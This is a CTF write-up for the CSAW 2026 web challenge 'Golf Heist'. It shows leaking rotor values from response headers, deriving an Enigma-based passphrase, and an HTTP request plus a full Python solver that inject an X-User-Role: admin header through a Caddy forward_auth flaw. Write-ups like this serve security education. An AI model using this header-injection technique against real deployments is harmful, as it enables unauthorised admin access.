# Golf Heist — CSAW 2026 (Web)

- **Event:** CSAW 2026 (CSAW26)
- **Category:** Web
- **Flag format:** `csaw{...}`
- **Author:** Talel (writeup based on the CSAW26 challenge)

---

## Summary

*Golf Heist* is a three-step web challenge centered on a Caddy reverse proxy. The chain is:

1. Leak three rotor settings from `418 I'm a teapot` response headers.
2. Run those rotors through a three-rotor Enigma with fixed input `G`, `O`, `L` to derive a passphrase.
3. Exploit a known Caddy `forward_auth` behavior (GHSA-7r4p-vjf4-gxv4) to inject an `X-User-Role: admin` header and retrieve the flag.

The challenge description gives the bug class away: *"The caddy carries everything for them — keys, secrets, headers… and he doesn't check what's in the bag."*

---

## Target

```
https://golf-heist.ctf.csaw.io/
```

---

## Step 1 — Leak the rotor settings

Three inventory endpoints return `418 I'm a teapot` and leak a base64-encoded, zero-padded integer in the `X-Golf-Hint` header:

| Endpoint | Header | Rotor |
|---|---|---|
| `/pro-shop/inventory/clubs` | `X-Golf-Hint` | R1 |
| `/pro-shop/inventory/balls` | `X-Golf-Hint` | R2 |
| `/pro-shop/inventory/bags` | `X-Golf-Hint` | R3 |

Example:

```
X-Golf-Hint: MDAwMDE4  →  "000018"  →  R1 = 18
```

The rotors are regenerated on every service restart, so a solver must read them live.

---

## Step 2 — Derive the passphrase

The leaked rotors drive a three-rotor Enigma (rotors I/II/III + reflector) over the fixed input letters `G`, `O`, `L`.

```python
ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
W = {
    "I":   "EKMFLGDQVZNTOWYHXUSPAIBRCJ",
    "II":  "AJDKSIRUXBLHWTMCQGZNPYFVOE",
    "III": "BDFHJLCPRTXVZNYEIWGAKMUSQO",
    "REF": "YRUHQSLDPXNGOKMIEBFZCWVJAT",
}

def enigma(r1, r2, r3):
    def f(c, w, o):
        return w[(ALPHA.index(c) + o) % 26]
    out = []
    for s in ["G", "O", "L"]:
        c = s
        c = f(c, W["I"],   r1 % 26)
        c = f(c, W["II"],  r2 % 26)
        c = f(c, W["III"], r3 % 26)
        c = W["REF"][ALPHA.index(c)]
        c = f(c, W["III"], (26 - r3 % 26) % 26)
        out.append(c)
    return out
```

For the example rotors `R1=18, R2=14, R3=15`, this produces the letters `W`, `O`, `H`.

The passphrase then indexes the word table at positions **0, 1, 0** (not 0,0,0):

```python
WORDS = {
    "A": ["albatross", "approach", "ace"],
    "B": ["birdie", "bogey", "bunker"],
    # ...
    "W": ["wedge", "water", "waggle"],
    "O": ["open", "out", "oath"],
    "H": ["handicap", "hazard", "hole"],
    # ...
}

PHRASE = [WORDS["W"][0], WORDS["O"][1], WORDS["H"][0]]
# → ["wedge", "out", "handicap"]
```

So the passphrase is `wedge out handicap`.

---

## Step 3 — Exploit the Caddy reverse proxy

The `/api/vault/admin-item` endpoint validates the phrase and then reads the user's role straight from the request:

```python
role = req.headers.get("X-User-Role", "")
if role.lower() == "admin":
    return {... "flag": FLAG ...}
```

The leaked Caddyfile shows why this is exploitable:

```
:8000 {
    forward_auth 127.0.0.1:9091 {
        uri /auth
        copy_headers X-User-Id X-User-Role
    }
    reverse_proxy 127.0.0.1:9092
}
```

Caddy's `forward_auth` with `copy_headers` copies `X-User-Id` and `X-User-Role` from the auth response, but **does not strip client-supplied headers first**. A header set by the client survives to the backend.

This is **GHSA-7r4p-vjf4-gxv4**.

Request:

```http
POST /api/vault/admin-item HTTP/1.1
Host: golf-heist.ctf.csaw.io
X-User-Role: admin
X-User-Id: caddy
Content-Type: application/json

{"phrase": "wedge out handicap"}
```

Response:

```json
{
  "success": true,
  "tier": "admin",
  "message": "Welcome, caddy. Identity header trusted. The caddy looked the other way.",
  "special_item": {
    "locked": false,
    "name": "The Golden Putter",
    "description": "Forged from a single billet of 18k gold. No grip. No mercy. One of one.",
    "provenance": "Taken from the Avispa vault, March 2025. The caddy never saw it leave."
  },
  "flag": "csaw{REDACTED}",
  "cve": "GHSA-7r4p-vjf4-gxv4",
  "exploit": "Caddy forward_auth copy_headers does not strip client-supplied headers. X-User-Role: admin was injected and trusted by the backend."
}
```

---

## Full solver

```python
#!/usr/bin/env python3
"""
Golf Heist solver — CSAW 2026 web challenge.

1. Reads rotor settings from 418 teapot response headers.
2. Derives the passphrase through a three-rotor Enigma.
3. Injects X-User-Role: admin via Caddy forward_auth header bug.

Usage:
  python solve.py https://golf-heist.ctf.csaw.io
"""
import base64
import json
import sys
import requests

B = sys.argv[1] if len(sys.argv) > 1 else "https://golf-heist.ctf.csaw.io"
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"

ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
W = {
    "I":   "EKMFLGDQVZNTOWYHXUSPAIBRCJ",
    "II":  "AJDKSIRUXBLHWTMCQGZNPYFVOE",
    "III": "BDFHJLCPRTXVZNYEIWGAKMUSQO",
    "REF": "YRUHQSLDPXNGOKMIEBFZCWVJAT",
}


def enigma(r1, r2, r3):
    def f(c, w, o):
        return w[(ALPHA.index(c) + o) % 26]
    out = []
    for sym in ["G", "O", "L"]:
        c = sym
        c = f(c, W["I"], r1 % 26)
        c = f(c, W["II"], r2 % 26)
        c = f(c, W["III"], r3 % 26)
        c = W["REF"][ALPHA.index(c)]
        c = f(c, W["III"], (26 - r3 % 26) % 26)
        out.append(c)
    return out


def main():
    # 1) leak rotor settings from the teapot endpoints
    rot = {}
    for path, key in (("clubs", "r1"), ("balls", "r2"), ("bags", "r3")):
        r = s.get(f"{B}/pro-shop/inventory/{path}", timeout=20)
        h = r.headers.get("X-Golf-Hint", "")
        rot[key] = int(base64.b64decode(h).decode())
        print(f"[*] {path:6} {r.status_code} hint={h} -> {key}={rot[key]}")

    # 2) derive the passphrase (word indices are 0, 1, 0)
    letters = enigma(rot["r1"], rot["r2"], rot["r3"])
    words = s.get(f"{B}/api/word-table", timeout=20).json()["table"]
    phrase = " ".join([words[letters[0]][0], words[letters[1]][1], words[letters[2]][0]])
    print(f"[*] rotor letters : {letters}")
    print(f"[+] phrase        : {phrase!r}")

    # 3) header injection through the caddy (GHSA-7r4p-vjf4-gxv4)
    r = s.post(
        f"{B}/api/vault/admin-item",
        json={"phrase": phrase},
        headers={"X-User-Role": "admin", "X-User-Id": "caddy"},
        timeout=20,
    )
    print(f"[*] admin-item    : {r.status_code}")
    print(json.dumps(r.json(), indent=2)[:1200])


if __name__ == "__main__":
    main()
```

---

## Flag

```
csaw{REDACTED}
```

---

## Files

- `solve.py` — full live solver.
- `app/main.py` — challenge source (released player files).
- `Dockerfile`, `requirements.txt` — for local testing.

---

## References

- Caddy security advisory: [GHSA-7r4p-vjf4-gxv4](https://github.com/caddyserver/caddy/security/advisories/GHSA-7r4p-vjf4-gxv4)
